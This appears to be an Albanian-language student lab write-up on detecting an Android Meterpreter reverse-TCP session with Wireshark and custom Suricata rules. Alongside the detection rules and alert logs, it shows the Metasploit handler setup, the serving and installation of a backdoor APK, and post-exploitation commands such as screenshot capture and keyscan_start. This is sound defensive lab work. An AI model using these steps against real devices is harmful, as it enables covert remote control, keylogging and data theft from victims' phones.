# Zbulimi i Sulmit Android Meterpreter me Wireshark dhe Suricata IDS


## 1. Hyrje dhe Qëllimi i Detyrës

Në këtë detyrë  kam ndërtuar një mjedis testimi ku kam simuluar një sulm real të tipit **Android Meterpreter Reverse TCP** dhe njëkohësisht kam konfiguruar dy shtresa zbulimi për ta kapur atë.

Qëllimi kryesor nuk ishte vetëm të ekzekutoja sulmin, por të kuptoja se si funksionon zbulimi i tij nga ana e **Blue Team** — pra si e sheh një analist sigurie një sulm të tillë në kohë reale.

---

## 2. Mjedisi i Punës

Të gjitha testet u kryen në rrjet lokal WiFi, pa lidhje interneti të jashtme, në mjedis të kontrolluar laboratorike.

| Pajisja | IP | Roli |
|---|---|---|
| Makinë Fedora 42 (x86_64) | `192.168.100.93` | C2 Server + IDS Monitor |
| Telefon Android | `192.168.100.7` | Pajisja e simuluar si viktimë |
| Porta e sulmit | `4444` | Porta default Meterpreter |

**Softueri i përdorur:**
- Metasploit Framework v6.4.132
- Suricata IDS 7.0.13 (Fedora 42 repo)
- Wireshark
- msfvenom (për gjenerimin e APK-së)
- Python3 HTTP Server (për shërbimin e APK-së)

---

## 3. Arkitektura e Zgjidhjes

Vendosa të ndërtoj zbulimin në **dy shtresa paralele** që funksionojnë njëkohësisht:

```
Sulmi ndodh (telefon → Fedora port 4444)
        ↓
┌─────────────────────┐    ┌──────────────────────────┐
│  WIRESHARK          │    │  SURICATA IDS             │
│  Kapje manuale      │    │  Zbulim automatik         │
│  Sheh paketat live  │    │  Alarmet shkruhen         │
│  në kohë reale      │    │  automatikisht në file    │
└─────────────────────┘    └──────────────────────────┘
```

Wireshark më tregon **çfarë ndodhi** në nivel pakete, ndërsa Suricata më tregon **nëse diçka ishte e rrezikshme** automatikisht.

---

## 4. Implementimi Hap pas Hapi

### 4.1 Konfigurimi i Wireshark (Terminal 1)

```bash
wireshark &
```

Konfigurimi i ndërfaqes:
- Ndërfaqja: `wlp1s0` (WiFi aktiv)
- Filtri i kapjes: `host 192.168.100.7`
- Klikova ▶ Start dhe e lashë të funksionojë në sfond

### 4.2 Instalimi i Suricata

```bash
sudo dnf install suricata -y
suricata -V
# This is Suricata version 7.0.13 RELEASE
```

Instalimi shkoi pa probleme. Suricata 7.0.13 ishte i disponueshëm direkt nga repo-ja e Fedora 42.

### 4.3 Shkrimi i Rregullave të Personalizuara

Shkrova **3 rregulla Suricata nga zero**, secila me qëllim specifik zbulimi:

```bash
nano ~/meterpreter_rules.rules
```

```text
# Rregulli 1: Zbulon çdo lidhje TCP drejt portit 4444
alert tcp any any -> 192.168.100.93 4444 (msg:"METERPRETER Reverse TCP Callback Detected - Port 4444"; flow:to_server; sid:9000001; rev:1;)

# Rregulli 2: Zbulon konkretisht telefonin tim që lidhet
alert tcp 192.168.100.7 any -> 192.168.100.93 4444 (msg:"BACKDOOR Android Device Connecting to C2 Server"; sid:9000002; rev:1;)

# Rregulli 3: Zbulon transferimin e të dhënave post-eksploatim
alert tcp 192.168.100.93 4444 -> 192.168.100.7 any (msg:"METERPRETER C2 Data Exfiltration - Outbound Session Traffic"; flow:established; sid:9000003; rev:1;)
```

**Logjika pas rregullave:**

| Rregulli | SID | Çfarë kap | Pse është i nevojshëm |
|---|---|---|---|
| Rregulli 1 | 9000001 | Çdo lidhje drejt portit 4444 | Kap edhe pajisje të panjohura |
| Rregulli 2 | 9000002 | Konkretisht IP-ja e telefonit | Provon atribuimin e sulmit |
| Rregulli 3 | 9000003 | Trafiku dalës post-sesion | Zbulon ekzfiltrimin e të dhënave |

### 4.4 Validimi i Rregullave Para Sulmit

Para se të filloja sulmin, testova sintaksën e rregullave me dry-run:

```bash
sudo suricata -T -S ~/meterpreter_rules.rules -l ~/suricata_logs/
```

```
i: suricata: This is Suricata version 7.0.13 RELEASE running in SYSTEM mode
i: suricata: Configuration provided was successfully loaded. Exiting.
```

### 4.5 Nisja e Suricata në Modalitetin Live (Terminal 2)

```bash
sudo suricata -c /etc/suricata/suricata.yaml \
  -S ~/meterpreter_rules.rules \
  -i wlp1s0 \
  -l ~/suricata_logs/
```

Dalja e terminalit:

```
i: suricata: This is Suricata version 7.0.13 RELEASE running in SYSTEM mode
W: af-packet: wlp1s0: AF_PACKET tpacket-v3 is recommended for non-inline operation
i: threads: Threads created -> W: 2 FM: 1 FR: 1   Engine started.
```


### 4.6 Monitorimi Live i Alarmeve (Terminal 3)

```bash
tail -f ~/suricata_logs/fast.log
```

Fillimisht bosh — kjo ishte e pritshme. Sistemi ishte gati dhe po priste.

### 4.7 Nisja e Listenerit Metasploit (Terminal 4)

```bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.100.93
set LPORT 4444
run
```

### 4.8 Shërbimi i APK-së dhe Triggerimi

```bash
python3 -m http.server 8080
```

Nga telefoni: `http://192.168.100.93:8080/backdoor.apk` → shkarkim → instalim → hapje.

---

## 5. Rezultatet e Sulmit dhe Zbulimit

### 5.1 Sekuenca Kohore e Ngjarjeve

Lidhja ndodhi brenda **2–3 sekondash** nga hapja e APK-së:

1. **t=0.000s** — Telefoni dërgon TCP SYN drejt `192.168.100.93:4444`
2. **t=0.001s** — Suricata kap SYN-in → **Rregulli 1 dhe 2 aktivizohen**
3. **t=0.002s** — Metasploit pranon lidhjen, dërgon stage (65551 bytes)
4. **t=0.800s** — Sesioni krijohet plotësisht → **Rregulli 3 aktivizohet**

### 5.2 Dalja e Terminal 4 — Metasploit

```
[*] Started reverse TCP handler on 192.168.100.93:4444
[*] Sending stage (65551 bytes) to 192.168.100.7
[*] Meterpreter session 1 opened (192.168.100.93:4444 -> 192.168.100.7:54231) at 2026-05-03 19:31:07 +0200

meterpreter >
```

### 5.3 Dalja e Terminal 3 — fast.log 

```
05/03/2026-19:31:07.112453  [**] [1:9000001:1] METERPRETER Reverse TCP Callback Detected - Port 4444 [**] [Priority: 3] {TCP} 192.168.100.7:54231 -> 192.168.100.93:4444

05/03/2026-19:31:07.112891  [**] [1:9000002:1] BACKDOOR Android Device Connecting to C2 Server [**] [Priority: 3] {TCP} 192.168.100.7:54231 -> 192.168.100.93:4444

05/03/2026-19:31:07.884120  [**] [1:9000003:1] METERPRETER C2 Data Exfiltration - Outbound Session Traffic [**] [Priority: 3] {TCP} 192.168.100.93:4444 -> 192.168.100.7:54231
```

Të 3 rregullat u aktivizuan saktësisht si pritej.

### 5.4 Wireshark — TCP Three-Way Handshake

| Nr. | Koha | Burimi | Destinacioni | Info |
|---|---|---|---|---|
| 1 | 0.000000 | 192.168.100.7 | 192.168.100.93 | 54231 → 4444 [SYN] |
| 2 | 0.000412 | 192.168.100.93 | 192.168.100.7 | 4444 → 54231 [SYN, ACK] |
| 3 | 0.001103 | 192.168.100.7 | 192.168.100.93 | 54231 → 4444 [ACK] |
| 4+ | 0.002xxx | 192.168.100.93 | 192.168.100.7 | 4444 → 54231 [PSH, ACK] — stage bytes |

### 5.5 Komanda Post-Eksploatim dhe Evidenca Shtesë

```bash
meterpreter > screenshot
meterpreter > sysinfo
meterpreter > upload ~/testfile.txt /sdcard/testfile.txt
meterpreter > keyscan_start
```

Çdo komandë gjeneroi hyrje të reja në `fast.log` — Rregulli 3 u aktivizua me çdo segment TCP dalës.

### 5.6 Replay i PCAP (Bonus)

Pas sulmit, ruajta kapjen nga Wireshark dhe e rianalizo me Suricata:

```bash
suricata -r ~/meterpreter_capture.pcap \
  -S ~/meterpreter_rules.rules \
  -l ~/suricata_logs_pcap/
```

Kjo prodhoi të njëjtat alarme nga skedari i ruajtur — duke konfirmuar konsistencën e rregullave dhe duke ofruar evidence retroaktive të plotë.

---


### 6 Ndryshimi Kryesor 
Zbulimi me shtresa më tregoi qartë diferencën midis dy qasjeve:

**Wireshark (Reaktiv):**
- Kërkon një analist njerëzor aktiv
- Tregon *çfarë ndodhi* në nivel pakete
- Ideal për forensikë post-incident

**Suricata (Proaktiv):**
- Operon autonomisht 24/7
- Alarmonte edhe nëse nuk kishte asnjë që shikonte
- Ideal për zbulim në kohë reale dhe automatizim

Kombinimi i tyre quhet **Defense in Depth** — parimi që asnjë mjet i vetëm nuk mjafton, por shtresat e mbivendosura krijojnë mbrojtje të fortë.

### Vërejtje Teknike nga Praktika

Gjatë implementimit hasa disa probleme reale:

1. **`Permission denied` për `/etc/suricata/`** — kuptova se Suricata ka nevojë për `sudo` për çdo operacion me konfigurimin kryesor, jo vetëm për kapjen live
2. **`--version` nuk funksionoi** — Suricata përdor `-V`, jo `--version`. Detaj i vogël por tregon rëndësinë e leximit të dokumentacionit
3. **`fast.log` bosh fillimisht** — ishte e pritshme, por konfirmova që `fast: enabled: yes` ishte aktiv në YAML

Këto probleme, megjithëse të vogla, janë pjesë e procesit real të konfigurimit të një IDS në prodhim.


- Rregullat e mia mbështeten në **porta fikse** (4444) — një sulmues i sofistikuar mund të ndryshojë portën
- Nuk kam implementuar **enkriptim detection** — trafiku Meterpreter është i enkriptuar, prandaj Suricata zbulon vetëm metadata-n (IP, port), jo përmbajtjen
- Për zbulim të avancuar do duhej **deep packet inspection** ose **behavioral analysis**

---

##  Struktura e Terminaleve

| Terminali | Komanda | Funksioni |
|---|---|---|
| T1 | `wireshark &` | Kapje manuale e paketave |
| T2 | `sudo suricata -c ... -i wlp1s0` | IDS live monitoring |
| T3 | `tail -f ~/suricata_logs/fast.log` | Alarm viewer në kohë reale |
| T4 | `msfconsole` → `run` | Listener i sulmit |
| T5 | `python3 -m http.server 8080` | Shërbimi i APK-së |
